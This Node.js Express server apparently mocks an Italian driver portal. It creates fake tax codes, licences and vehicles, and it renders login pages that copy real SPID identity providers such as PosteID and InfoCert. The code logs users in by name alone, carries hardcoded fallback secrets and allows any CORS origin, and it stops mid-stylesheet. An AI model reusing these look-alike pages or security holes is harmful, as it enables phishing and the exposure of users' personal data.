const express = require('express');
const cors = require('cors');
const session = require('express-session');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');
const Database = require('better-sqlite3');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'portale-automobilista-secret-key-2024';

// ── SQLite Database ───────────────────────────────────────────────────────────
const db = new Database(path.join(__dirname, 'database.sqlite'));
db.pragma('journal_mode = WAL');

db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id            TEXT PRIMARY KEY,
    tax_id        TEXT UNIQUE NOT NULL,
    first_name    TEXT NOT NULL,
    last_name     TEXT NOT NULL,
    email         TEXT NOT NULL,
    auth_method   TEXT NOT NULL,
    license_number   TEXT NOT NULL,
    license_points   INTEGER NOT NULL DEFAULT 20,
    license_expiry   TEXT NOT NULL,
    license_category TEXT NOT NULL DEFAULT 'B',
    created_at    TEXT DEFAULT (datetime('now'))
  );

  CREATE TABLE IF NOT EXISTS vehicles (
    id                 TEXT PRIMARY KEY,
    user_id            TEXT NOT NULL REFERENCES users(id),
    plate              TEXT NOT NULL,
    brand              TEXT NOT NULL,
    model              TEXT NOT NULL,
    environmental_class TEXT NOT NULL DEFAULT 'EURO4',
    vehicle_type       TEXT NOT NULL DEFAULT 'AUTOVEICOLO'
  );
`);

const stmts = {
  findByTaxId:    db.prepare('SELECT * FROM users WHERE tax_id = ?'),
  findById:       db.prepare('SELECT * FROM users WHERE id = ?'),
  createUser:     db.prepare(`
    INSERT INTO users (id, tax_id, first_name, last_name, email, auth_method,
      license_number, license_points, license_expiry, license_category)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `),
  updateMethod:   db.prepare('UPDATE users SET auth_method = ?, email = ? WHERE tax_id = ?'),
  userVehicles:   db.prepare('SELECT * FROM vehicles WHERE user_id = ?'),
  createVehicle:  db.prepare(`
    INSERT INTO vehicles (id, user_id, plate, brand, model, environmental_class, vehicle_type)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `),
  findByName:     db.prepare(`SELECT * FROM users WHERE lower(first_name)=lower(?) AND lower(last_name)=lower(?) LIMIT 1`),
  updateTaxId:    db.prepare(`UPDATE users SET tax_id=?, email=?, auth_method=? WHERE id=?`),
  // Admin statements
  allUsers:       db.prepare(`SELECT * FROM users ORDER BY last_name, first_name`),
  searchUsers:    db.prepare(`SELECT * FROM users WHERE lower(first_name||' '||last_name) LIKE lower(?) ORDER BY last_name, first_name`),
  updateUser:     db.prepare(`UPDATE users SET first_name=?, last_name=?, email=?, license_number=?, license_points=?, license_expiry=?, license_category=? WHERE id=?`),
  vehicleById:    db.prepare('SELECT * FROM vehicles WHERE id = ?'),
  updateVehicle:  db.prepare(`UPDATE vehicles SET plate=?, brand=?, model=?, environmental_class=?, vehicle_type=? WHERE id=?`),
  deleteVehicle:  db.prepare('DELETE FROM vehicles WHERE id = ?'),
};

// ── Codice Fiscale Validation (full checksum algorithm) ───────────────────────
function validateCodiceFiscale(cf) {
  if (!cf || typeof cf !== 'string') return false;
  cf = cf.toUpperCase().replace(/\s/g, '');
  if (cf.length !== 16) return false;
  if (!/^[A-Z]{6}[0-9]{2}[A-EHLMPRST][0-9]{2}[A-Z][0-9]{3}[A-Z]$/.test(cf)) return false;

  // Odd-position (1-indexed) character values
  const ODD = {
    '0':1, '1':0, '2':5, '3':7, '4':9, '5':13, '6':15, '7':17, '8':19, '9':21,
    A:1, B:0, C:5, D:7, E:9, F:13, G:15, H:17, I:19, J:21, K:2, L:4, M:18,
    N:20, O:11, P:3, Q:6, R:8, S:12, T:14, U:16, V:10, W:22, X:25, Y:24, Z:23
  };
  // Even-position character values
  const EVEN = {
    '0':0, '1':1, '2':2, '3':3, '4':4, '5':5, '6':6, '7':7, '8':8, '9':9,
    A:0, B:1, C:2, D:3, E:4, F:5, G:6, H:7, I:8, J:9, K:10, L:11, M:12,
    N:13, O:14, P:15, Q:16, R:17, S:18, T:19, U:20, V:21, W:22, X:23, Y:24, Z:25
  };

  let sum = 0;
  for (let i = 0; i < 15; i++) {
    sum += (i % 2 === 0) ? ODD[cf[i]] : EVEN[cf[i]];
  }
  return cf[15] === String.fromCharCode(65 + (sum % 26));
}

// ── Deterministic mock profile from Codice Fiscale ───────────────────────────
function generateProfile(cf) {
  // Produce a stable integer hash from the CF
  const hash = cf.split('').reduce((acc, ch, i) => acc + ch.charCodeAt(0) * (i + 7), 0);

  const BRANDS = ['FIAT', 'VOLKSWAGEN', 'AUDI', 'TOYOTA', 'FORD', 'BMW', 'RENAULT'];
  const MODELS  = {
    FIAT:       ['PANDA', 'PUNTO', '500', 'TIPO', 'BRAVO'],
    VOLKSWAGEN: ['GOLF', 'POLO', 'PASSAT', 'TIGUAN', 'T-ROC'],
    AUDI:       ['A3', 'A4', 'A6', 'Q3', 'Q5'],
    TOYOTA:     ['YARIS', 'COROLLA', 'RAV4', 'C-HR', 'AURIS'],
    FORD:       ['FIESTA', 'FOCUS', 'PUMA', 'KUGA', 'MONDEO'],
    BMW:        ['Serie 1', 'Serie 3', 'Serie 5', 'X1', 'X3'],
    RENAULT:    ['CLIO', 'MEGANE', 'CAPTUR', 'KADJAR', 'ZOE'],
  };
  const ENV_CLASSES = ['EURO4', 'EURO5', 'EURO6', 'EURO6D'];
  const LETTERS = 'ABCDEFGHJKLMNPRSTUVWXYZ';

  const brand = BRANDS[hash % BRANDS.length];
  const model = MODELS[brand][Math.floor(hash / 7) % MODELS[brand].length];
  const envClass = ENV_CLASSES[Math.floor(hash / 13) % ENV_CLASSES.length];

  // Italian plate format: LL 000 LL
  const L = (n) => LETTERS[Math.floor(hash / n) % LETTERS.length];
  const plate = L(1) + L(3) + String(100 + (Math.floor(hash / 11) % 900)) + L(17) + L(19);

  const points = 20 + (hash % 10);  // 20–29
  const expiryYear = 2025 + (hash % 8);
  const expiryMonth = String(1 + (Math.floor(hash / 31) % 12)).padStart(2, '0');
  const licenseNum = cf.slice(0, 6) + String(100000 + (hash % 899999)) + LETTERS[hash % LETTERS.length];

  return {
    licensePoints:   points,
    licenseExpiry:   `${expiryMonth}/${expiryYear}`,
    licenseNumber:   licenseNum,
    licenseCategory: 'B',
    vehicle: { plate, brand, model, environmentalClass: envClass, type: 'AUTOVEICOLO' },
  };
}

// ── Generate a structurally valid (checksum-correct) fake Codice Fiscale ─────
function generateFakeCF(firstName, lastName) {
  const ODD  = {'0':1,'1':0,'2':5,'3':7,'4':9,'5':13,'6':15,'7':17,'8':19,'9':21,A:1,B:0,C:5,D:7,E:9,F:13,G:15,H:17,I:19,J:21,K:2,L:4,M:18,N:20,O:11,P:3,Q:6,R:8,S:12,T:14,U:16,V:10,W:22,X:25,Y:24,Z:23};
  const EVEN = {'0':0,'1':1,'2':2,'3':3,'4':4,'5':5,'6':6,'7':7,'8':8,'9':9,A:0,B:1,C:2,D:3,E:4,F:5,G:6,H:7,I:8,J:9,K:10,L:11,M:12,N:13,O:14,P:15,Q:16,R:17,S:18,T:19,U:20,V:21,W:22,X:23,Y:24,Z:25};
  const pad = (s, n) => (s.toUpperCase().replace(/[^A-Z]/g, '') + 'XXXXX').slice(0, n);
  const rn = (max) => Math.floor(Math.random() * max);
  const ln = pad(lastName, 3);
  const fn = pad(firstName, 3);
  const yr = String(rn(99)).padStart(2, '0');
  const mo = 'ABCDEHLMPRST'[rn(12)];
  const dy = String(rn(28) + 1).padStart(2, '0');
  const ct = 'H' + String(rn(899) + 100);
  const sq = String(rn(999)).padStart(3, '0');
  const base = (ln + fn + yr + mo + dy + ct + sq).toUpperCase();
  let sum = 0;
  for (let i = 0; i < 15; i++) sum += (i % 2 === 0) ? ODD[base[i]] : EVEN[base[i]];
  return base + String.fromCharCode(65 + (sum % 26));
}

// ── JWT auth middleware ────────────────────────────────────────────────────────
function requireAuth(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ success: false, message: 'Token mancante' });
  try {
    req.decoded = jwt.verify(token, JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ success: false, message: 'Token non valido o scaduto. Effettuare nuovamente il login.' });
  }
}

// ── Express middleware ─────────────────────────────────────────────────────────
app.use(cors({
  origin: (origin, cb) => cb(null, true),
  credentials: true,
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: JWT_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 },
}));

// ── Shared login handler for SPID and CIE ─────────────────────────────────────
function handleLogin(authMethod) {
  return (req, res) => {
    try {
      const { taxId, firstName, lastName, email } = req.body;

      if (!firstName?.trim() || !lastName?.trim()) {
        return res.status(400).json({
          success: false,
          message: 'Nome e Cognome sono obbligatori.',
        });
      }

      // taxId and email are optional
      let cf = taxId ? taxId.toUpperCase().replace(/\s/g, '') : null;
      if (cf && !validateCodiceFiscale(cf)) {
        return res.status(400).json({
          success: false,
          message: 'Codice Fiscale non valido. Verificare il formato (es. RSSMRA80A01H501U).',
        });
      }

      // 1. Name is the primary identifier — look up by first + last name
      let user = stmts.findByName.get(firstName.trim(), lastName.trim());

      if (user) {
        // Found by name: update CF/email only if the user provided them
        const newCf    = cf    || user.tax_id;
        const newEmail = email?.trim() || user.email;
        stmts.updateTaxId.run(newCf, newEmail, authMethod, user.id);
        user = stmts.findById.get(user.id);
        cf = newCf;
      } else {
        // 2. No name match — fall back to CF lookup if one was provided
        if (cf) {
          user = stmts.findByTaxId.get(cf);
          if (user) stmts.updateMethod.run(authMethod, email?.trim() || user.email, cf);
        }
        if (!user) {
          // 3. New user — generate CF if not provided
          if (!cf) {
            cf = generateFakeCF(firstName.trim(), lastName.trim());
            let attempts = 0;
            while (stmts.findByTaxId.get(cf) && attempts++ < 10)
              cf = generateFakeCF(firstName.trim(), lastName.trim());
          }
          const profile = generateProfile(cf);
          const userId  = uuidv4();
          const userEmail = email?.trim() || `${firstName.trim().toLowerCase()}.${lastName.trim().toLowerCase()}@esempio.it`;
          stmts.createUser.run(
            userId, cf, firstName.trim(), lastName.trim(), userEmail, authMethod,
            profile.licenseNumber, profile.licensePoints, profile.licenseExpiry, profile.licenseCategory,
          );
          stmts.createVehicle.run(
            uuidv4(), userId,
            profile.vehicle.plate, profile.vehicle.brand, profile.vehicle.model,
            profile.vehicle.environmentalClass, profile.vehicle.type,
          );
          user = stmts.findById.get(userId);
        }
      }

      const token = jwt.sign({ userId: user.id, taxId: user.tax_id }, JWT_SECRET, { expiresIn: '24h' });
      req.session.userId = user.id;

      res.json({
        success: true,
        message: `Accesso ${authMethod} effettuato con successo`,
        token,
        user: {
          id:         user.id,
          name:       `${user.first_name} ${user.last_name}`,
          email:      user.email,
          taxId:      cf,
          authMethod,
        },
      });
    } catch (err) {
      console.error('Login error:', err);
      res.status(500).json({ success: false, message: 'Errore interno del server.' });
    }
  };
}

// ── Routes ────────────────────────────────────────────────────────────────────
app.post('/api/auth/spid-login', handleLogin('SPID'));
app.post('/api/auth/cie-login',  handleLogin('CIE'));

app.get('/api/user/dashboard', requireAuth, (req, res) => {
  try {
    const user = stmts.findById.get(req.decoded.userId);
    if (!user) return res.status(404).json({ success: false, message: 'Utente non trovato.' });

    const vehicles = stmts.userVehicles.all(user.id);

    res.json({
      success: true,
      data: {
        name:       `${user.first_name} ${user.last_name}`,
        firstName:  user.first_name,
        lastName:   user.last_name,
        email:      user.email,
        taxId:      user.tax_id,
        authMethod: user.auth_method,
        license: {
          number:   user.license_number,
          points:   user.license_points,
          expiry:   user.license_expiry,
          category: user.license_category,
        },
        vehicles: vehicles.map(v => ({
          plate:            v.plate,
          brand:            v.brand,
          model:            v.model,
          environmentalClass: v.environmental_class,
          type:             v.vehicle_type,
        })),
      },
    });
  } catch (err) {
    console.error('Dashboard error:', err);
    res.status(500).json({ success: false, message: 'Errore interno del server.' });
  }
});

app.post('/api/auth/logout', (req, res) => {
  req.session.destroy(() => {
    res.json({ success: true, message: 'Logout effettuato con successo.' });
  });
});

app.get('/api/health', (_req, res) => {
  res.json({ status: 'OK', timestamp: new Date(), database: 'SQLite attivo' });
});

// ── Admin area ────────────────────────────────────────────────────────────────
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'AdminPortale2024!';

function requireAdmin(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ success: false, message: 'Token mancante' });
  try {
    const pl = jwt.verify(token, JWT_SECRET);
    if (pl.role !== 'admin') throw new Error('Not admin');
    next();
  } catch {
    res.status(401).json({ success: false, message: 'Accesso non autorizzato' });
  }
}

app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (!password || password !== ADMIN_PASSWORD)
    return res.status(401).json({ success: false, message: 'Password errata' });
  const token = jwt.sign({ role: 'admin' }, JWT_SECRET, { expiresIn: '8h' });
  res.json({ success: true, token });
});

app.post('/api/admin/users', requireAdmin, (req, res) => {
  const { firstName, lastName, email, taxId } = req.body;
  if (!firstName?.trim() || !lastName?.trim())
    return res.status(400).json({ success: false, message: 'Nome e Cognome sono obbligatori' });

  let cf = taxId ? taxId.toUpperCase().replace(/\s/g, '') : generateFakeCF(firstName.trim(), lastName.trim());

  // Ensure CF is unique (retry with fresh random if collision)
  let attempts = 0;
  while (stmts.findByTaxId.get(cf) && attempts++ < 10)
    cf = generateFakeCF(firstName.trim(), lastName.trim());
  if (stmts.findByTaxId.get(cf))
    return res.status(409).json({ success: false, message: 'Codice Fiscale già in uso' });

  const profile = generateProfile(cf);
  const userId  = uuidv4();
  stmts.createUser.run(userId, cf, firstName.trim(), lastName.trim(),
    email?.trim() || `${firstName.trim().toLowerCase()}.${lastName.trim().toLowerCase()}@esempio.it`,
    'ADMIN', profile.licenseNumber, profile.licensePoints, profile.licenseExpiry, profile.licenseCategory);
  stmts.createVehicle.run(uuidv4(), userId, profile.vehicle.plate, profile.vehicle.brand,
    profile.vehicle.model, profile.vehicle.environmentalClass, profile.vehicle.type);

  res.json({ success: true, message: 'Utente creato', id: userId, taxId: cf });
});

app.get('/api/admin/users', requireAdmin, (req, res) => {
  const q = req.query.q?.trim();
  const users = q ? stmts.searchUsers.all(`%${q}%`) : stmts.allUsers.all();
  res.json({ success: true, data: users.map(u => ({
    id: u.id, firstName: u.first_name, lastName: u.last_name,
    taxId: u.tax_id, email: u.email, authMethod: u.auth_method,
    licenseNumber: u.license_number, licensePoints: u.license_points,
    licenseExpiry: u.license_expiry, licenseCategory: u.license_category,
    createdAt: u.created_at,
  }))});
});

app.get('/api/admin/users/:id', requireAdmin, (req, res) => {
  const user = stmts.findById.get(req.params.id);
  if (!user) return res.status(404).json({ success: false, message: 'Utente non trovato' });
  const vehicles = stmts.userVehicles.all(user.id);
  res.json({ success: true, data: {
    id: user.id, firstName: user.first_name, lastName: user.last_name,
    taxId: user.tax_id, email: user.email, authMethod: user.auth_method,
    licenseNumber: user.license_number, licensePoints: user.license_points,
    licenseExpiry: user.license_expiry, licenseCategory: user.license_category,
    vehicles: vehicles.map(v => ({
      id: v.id, plate: v.plate, brand: v.brand, model: v.model,
      environmentalClass: v.environmental_class, type: v.vehicle_type,
    })),
  }});
});

app.put('/api/admin/users/:id', requireAdmin, (req, res) => {
  const { firstName, lastName, email, licenseNumber, licensePoints, licenseExpiry, licenseCategory } = req.body;
  const user = stmts.findById.get(req.params.id);
  if (!user) return res.status(404).json({ success: false, message: 'Utente non trovato' });
  stmts.updateUser.run(
    firstName?.trim() || user.first_name,
    lastName?.trim()  || user.last_name,
    email?.trim()     || user.email,
    licenseNumber?.trim() || user.license_number,
    licensePoints !== undefined ? parseInt(licensePoints, 10) : user.license_points,
    licenseExpiry?.trim() || user.license_expiry,
    licenseCategory?.trim() || user.license_category,
    user.id,
  );
  res.json({ success: true, message: 'Utente aggiornato' });
});

app.put('/api/admin/vehicles/:vid', requireAdmin, (req, res) => {
  const v = stmts.vehicleById.get(req.params.vid);
  if (!v) return res.status(404).json({ success: false, message: 'Veicolo non trovato' });
  const { plate, brand, model, environmentalClass, type } = req.body;
  stmts.updateVehicle.run(
    plate?.trim() || v.plate,
    brand?.trim() || v.brand,
    model?.trim() || v.model,
    environmentalClass?.trim() || v.environmental_class,
    type?.trim() || v.vehicle_type,
    v.id,
  );
  res.json({ success: true, message: 'Veicolo aggiornato' });
});

app.post('/api/admin/users/:id/vehicles', requireAdmin, (req, res) => {
  const user = stmts.findById.get(req.params.id);
  if (!user) return res.status(404).json({ success: false, message: 'Utente non trovato' });
  const { plate, brand, model, environmentalClass, type } = req.body;
  if (!plate?.trim() || !brand?.trim() || !model?.trim())
    return res.status(400).json({ success: false, message: 'Targa, marca e modello sono obbligatori' });
  const vid = uuidv4();
  stmts.createVehicle.run(vid, user.id, plate.trim(), brand.trim(), model.trim(),
    environmentalClass?.trim() || 'EURO4', type?.trim() || 'AUTOVEICOLO');
  res.json({ success: true, message: 'Veicolo aggiunto', id: vid });
});

app.delete('/api/admin/vehicles/:vid', requireAdmin, (req, res) => {
  const v = stmts.vehicleById.get(req.params.vid);
  if (!v) return res.status(404).json({ success: false, message: 'Veicolo non trovato' });
  stmts.deleteVehicle.run(v.id);
  res.json({ success: true, message: 'Veicolo eliminato' });
});

// ── SPID Provider pages (each provider has its own branded login page) ────────
const SPID_PROVIDERS = [
  { id: 'infocert',    name: 'INFOCERT ID',    color: '#003087', light: '#e8f0fe', keys: ['infocert'] },
  { id: 'teamsystem',  name: 'TeamSystem ID',  color: '#e85d00', light: '#fff3ec', keys: ['teamsystem'] },
  { id: 'etna',        name: 'etnaID',         color: '#c0392b', light: '#fdf0ef', keys: ['etna'] },
  { id: 'poste',       name: 'PosteID',        color: '#ffcc00', light: '#fffbeb', textColor: '#333333', keys: ['poste'] },
  { id: 'intesi',      name: 'INTESI GROUP',   color: '#1a237e', light: '#e8eaf6', keys: ['intesi'] },
  { id: 'spidItalia',  name: 'SpidItalia',     color: '#009246', light: '#e8f5e9', keys: ['spiditaliaregister','spiditalia','spid italia'] },
  { id: 'namirial',    name: 'Namirial ID',    color: '#0d47a1', light: '#e3f2fd', keys: ['namirial'] },
  { id: 'aruba',       name: 'aruba.it ID',    color: '#c62828', light: '#ffebee', keys: ['aruba'] },
  { id: 'sielte',      name: 'SIELTE id',      color: '#01579b', light: '#e1f5fe', keys: ['sielte'] },
  { id: 'lepida',      name: 'Lepida ID',      color: '#2e7d32', light: '#e8f5e9', keys: ['lepida','lenoda'] },
  { id: 'cie',         name: 'CIE – Carta d\'Identità Elettronica', color: '#00518c', light: '#e3f2fd', keys: ['cie','carta d'] },
  { id: 'eidas',       name: 'eIDAS',          color: '#003399', light: '#e8eaf6', keys: ['eidas'] },
];

// Per-provider registry logo IDs (from idpciam.servizidt.it/registry/)
const PROVIDER_LOGOS = {
  aruba:      'arubaid',
  infocert:   'infocertid',
  poste:      'posteid',
  teamsystem: 'teamsystemid',
  spidItalia: 'spiditalia',
};

// Inline SPID badge SVG (AGID blue circle)
const SPID_BADGE_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120" width="52" height="52">
  <circle cx="60" cy="60" r="60" fill="#0066cc"/>
  <text x="60" y="74" text-anchor="middle" font-family="Arial Black,Arial,sans-serif"
        font-weight="900" font-size="30" fill="#fff" letter-spacing="-1">SPID</text>
</svg>`;

function providerLogoTag(id, name, height) {
  const lid = PROVIDER_LOGOS[id];
  if (!lid) return `<span style="font-size:1.1rem;font-weight:900;color:inherit">${name}</span>`;
  return `<img src="https://idpciam.servizidt.it/registry/img/spid-idp-${lid}.svg"
       alt="${name}" height="${height}" style="max-height:${height}px;object-fit:contain"
       onerror="this.outerHTML='<span style=\\'font-size:1.1rem;font-weight:900\\'>${name}</span>'">`;
}

// Shared login JS (injected into every provider page)
function loginScript(endpoint) {
  return `<script>
function go(){
  var e=document.getElementById('err');
  e.className=e.className.replace(' show','');
  var b={
    firstName:document.getElementById('fn').value.trim(),
    lastName:document.getElementById('ln').value.trim(),
    taxId:document.getElementById('cf').value.trim()||undefined,
    email:document.getElementById('em').value.trim()||undefined
  };
  if(!b.firstName||!b.lastName){
    e.textContent='Nome e Cognome sono obbligatori.';e.className+=' show';return;
  }
  var btn=document.getElementById('btn');
  btn.disabled=true;btn.textContent='Autenticazione in corso…';
  fetch('${endpoint}',{method:'POST',credentials:'include',
    headers:{'Content-Type':'application/json'},body:JSON.stringify(b)
  }).then(r=>r.json()).then(d=>{
    if(d.success){
      localStorage.setItem('token',d.token);
      localStorage.setItem('user',JSON.stringify(d.user));
      location.href='/dashboard.html';
    }else{
      e.textContent=d.message||"Errore durante l'accesso.";
      e.className+=' show';btn.disabled=false;btn.textContent='Accedi';
    }
  }).catch(()=>{
    e.textContent='Errore di connessione al server.';
    e.className+=' show';btn.disabled=false;btn.textContent='Accedi';
  });
}
document.addEventListener('keydown',e=>{if(e.key==='Enter')go();});
</script>`;
}

function providerPage(p) {
  // Provider-specific visual config
  const PCFG = {
    poste: {
      bg: '#0066cc', cardBg: '#fff', headerBg: '#fff', accentFg: '#0047bb',
      font: "'Open Sans',Arial,sans-serif", btnBg: '#0047bb', btnColor: '#fff',
      inputBorder: '#bbb', inputFocus: '#0066cc',
      tagline: 'Identità digitale Poste Italiane', layout: 'blue-bg',
    },
    infocert: {
      bg: '#f2f5f8', cardBg: '#fff', headerBg: '#003087', accentFg: '#003087',
      font: "'Titillium Web',Roboto,Arial,sans-serif", btnBg: '#003087', btnColor: '#fff',
      inputBorder: '#ccc', inputFocus: '#003087',
      tagline: 'La tua identità digitale certificata', layout: 'colored-header',
    },
    aruba: {
      bg: '#f5f5f5', cardBg: '#fff', headerBg: '#c62828', accentFg: '#c62828',
      font: "'Titillium Web',Roboto,Arial,sans-serif", btnBg: '#c62828', btnColor: '#fff',
      inputBorder: '#ccc', inputFocus: '#c62828',
      tagline: 'Identità digitale certificata', layout: 'colored-header',
    },
    teamsystem: {
      bg: '#fff', cardBg: '#fff', headerBg: '#e85d00', accentFg: '#e85d00',
      font: "'Titillium Web',sans-serif", btnBg: '#e85d00', btnColor: '#fff',
      inputBorder: '#ccc', inputFocus: '#e85d00',
      tagline: 'La tua identità digitale TeamSystem', layout: 'colored-header',
    },
    namirial: {
      bg: '#f0f4fc', cardBg: '#fff', headerBg: '#0d47a1', accentFg: '#0d47a1',
      font: "'Titillium Web',Roboto,sans-serif", btnBg: '#0d47a1', btnColor: '#fff',
      inputBorder: '#bbd', inputFocus: '#0d47a1',
      tagline: 'Identità digitale sicura e affidabile', layout: 'colored-header',
    },
    etna: {
      bg: '#fafafa', cardBg: '#fff', headerBg: '#b03020', accentFg: '#b03020',
      font: "'Titillium Web',Arial,sans-serif", btnBg: '#b03020', btnColor: '#fff',
      inputBorder: '#ccc', inputFocus: '#b03020',
      tagline: 'Il tuo SPID sicuro con etnaID', layout: 'colored-header',
    },
    intesi: {
      bg: '#f0f0f8', cardBg: '#fff', headerBg: '#1a237e', accentFg: '#1a237e',
      font: "Roboto,'Titillium Web',Arial,sans-serif", btnBg: '#1a237e', btnColor: '#fff',
      inputBorder: '#bbb', inputFocus: '#1a237e',
      tagline: 'Sicurezza e affidabilità digitale', layout: 'colored-header',
    },
    spidItalia: {
      bg: '#f5faf5', cardBg: '#fff', headerBg: '#009246', accentFg: '#009246',
      font: "'Titillium Web',Arial,sans-serif", btnBg: '#009246', btnColor: '#fff',
      inputBorder: '#ccc', inputFocus: '#009246',
      tagline: 'Il tuo SPID italiano', layout: 'colored-header',
    },
    sielte: {
      bg: '#f0f7ff', cardBg: '#fff', headerBg: '#01579b', accentFg: '#01579b',
      font: "'Titillium Web',Roboto,sans-serif", btnBg: '#01579b', btnColor: '#fff',
      inputBorder: '#bcd', inputFocus: '#01579b',
      tagline: 'Identità digitale SIELTE', layout: 'colored-header',
    },
    lepida: {
      bg: '#f5fbf5', cardBg: '#fff', headerBg: '#2e7d32', accentFg: '#2e7d32',
      font: "'Titillium Web',Arial,sans-serif", btnBg: '#2e7d32', btnColor: '#fff',
      inputBorder: '#bdb', inputFocus: '#2e7d32',
      tagline: 'La tua identità digitale Lepida ScpA', layout: 'colored-header',
    },
  };

  const c = PCFG[p.id] || {
    bg: p.light, cardBg: '#fff', headerBg: p.color, accentFg: p.color,
    font: "'Titillium Web',Arial,sans-serif", btnBg: p.color, btnColor: p.textColor || '#fff',
    inputBorder: '#ccc', inputFocus: p.color,
    tagline: 'Identità digitale SPID', layout: 'colored-header',
  };

  const logoHtml = providerLogoTag(p.id, p.name, 40);
  const isBlue = c.layout === 'blue-bg';

  // ── Blue-background layout (PosteID style) ────────────────────────────────
  if (isBlue) {
    return `<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${p.name} – Accesso SPID</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:${c.bg};min-height:100vh;display:flex;flex-direction:column;font-family:${c.font};padding-top:40px}
.page-wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:24px 16px 40px}
.card{background:#fff;border-radius:4px;max-width:480px;width:100%;box-shadow:0 2px 16px rgba(0,0,0,.22)}
.card-header{display:flex;align-items:center;justify-content:space-between;padding:18px 28px;border-bottom:1px solid #e8e8e8}
.card-body{padding:28px 28px 10px}
.card-body h2{font-size:1.35rem;font-weight:600;color:${c.accentFg};margin-bottom:4px}
.card-body .sub{font-size:.84rem;color:#777;margin-bottom:24px;line-height:1.5}
.err{background:#ffeaea;border:1px solid #f5c0c0;border-radius:3px;padding:10px 12px;color:#c00;font-size:.84rem;margin-bottom:14px}
.err:not(.show){display:none}
label{display:block;font-size:.76rem;font-weight:600;color:#555;margin-bottom:4px;text-transform:uppercase;letter-spacing:.05em}
input[type=text],input[type=email]{width:100%;border:1px solid ${c.inputBorder};border-radius:3px;padding:10px 12px;font-size:.95rem;margin-bottom:18px;font-family:inherit;background:#fff;color:#222}
input[type=text]:focus,input[type=email]:focus{outline:2px solid ${c.inputFocus};border-color:${c.inputFocus}}
.btn-login{background:${c.btnBg};color:${c.btnColor};border:none;border-radius:3px;padding:12px;font-size:.95rem;font-weight:700;cursor:pointer;width:100%;font-family:inherit;text-transform:uppercase;letter-spacing:.06em;margin:4px 0 16px}
.btn-login:hover{filter:brightness(.92)}
.btn-login:disabled{opacity:.55;cursor:not-allowed}
.card-links{display:flex;justify-content:space-between;margin-bottom:20px}
.card-links a{font-size:.82rem;color:${c.accentFg};text-decoration:none}
.card-links a:hover{text-decoration:underline}
.card-footer{border-top:1px solid #ebebeb;padding:12px 28px;text-align:center;font-size:.73rem;color:#aaa}
.card-footer a{color:#aaa;text-decoration:none}
.card-footer a:hover{text-decoration:underline}
.page-note{text-align:center;color:rgba(255,255,255,.65);font-size:.74rem;padding:14px}
</style>
</head>
<body>
<div class="page-wrap">
  <div class="card">
    <div class="card-header">
      ${SPID_BADGE_SVG}
      ${logoHtml}
    </div>
    <div class="card-body">
      <h2>Accedi con ${p.name}</h2>
      <p class="sub">${c.tagline}</p>
      <div class="err" id="err"></div>
      <label>Nome *</label>
      <input type="text" id="fn" placeholder="Mario" autocomplete="given-name">
      <label>Cognome *</label>
      <input type="text" id="ln" placeholder="Rossi" autocomplete="family-name">
      <label>Codice Fiscale <span style="font-weight:400;opacity:.7">(opzionale)</span></label>
      <input type="text" id="cf" placeholder="RSSMRA80A01H501U" maxlength="16"
             oninput="this.value=this.value.toUpperCase()" autocomplete="username">
      <label>Email <span style="font-weight:400;opacity:.7">(opzionale)</span></label>
      <input type="email" id="em" placeholder="mario.rossi@poste.it" autocomplete="email">
      <button class="btn-login" id="btn" onclick="go()">Accedi</button>
      <div class="card-links">
        <a href="#" onclick="return false;">Hai dimenticato le credenziali?</a>
        <a href="/login.html">&larr; Indietro</a>
      </div>
    </div>
    <div class="card-footer">
      <a href="#" onclick="return false;">Privacy</a> &bull;
      <a href="#" onclick="return false;">Note legali</a> &bull;
      <a href="#" onclick="return false;">Accessibilit&agrave;</a>
    </div>
  </div>
</div>
<div class="page-note">Portale dell'Automobilista &mdash; Autenticazione SPID</div>
${loginScript('/api/auth/spid-login')}
</body>
</html>`;
  }

  // ── Colored-header layout (all other providers) ───────────────────────────
  return `<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${p.name} – Accesso SPID</title>
<link href="https://fonts.googleapis.com/css2?family=Titillium+Web:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:${c.bg};min-height:100vh;display:flex;flex-direction:column;font-family:${c.font}}

/* ── Top navbar ── */
.topbar{background:${c.headerBg};padding:0}
.topbar-inner{max-width:960px;margin:0 auto;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;gap:16px}
.topbar-left{display:flex;align-items:center;gap:14px}
.topbar-provider-logo{height:38px;display:flex;align-items:center;color:#fff}
.topbar-divider{width:1px;height:30px;background:rgba(255,255,255,.3)}
.topbar-spid{display:flex;align-items:center;gap:6px;color:rgba(255,255,255,.85);font-size:.78rem;font-weight:700;letter-spacing:.04em}
.topbar-spid-badge{width:28px;height:28px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.55rem;font-weight:900;color:${c.headerBg};letter-spacing:-.02em}
.topbar-right{font-size:.78rem;color:rgba(255,255,255,.75)}

/* ── Main content ── */
main{flex:1;display:flex;justify-content:center;padding:40px 16px 60px}
.layout{display:flex;gap:28px;max-width:960px;width:100%;align-items:flex-start}

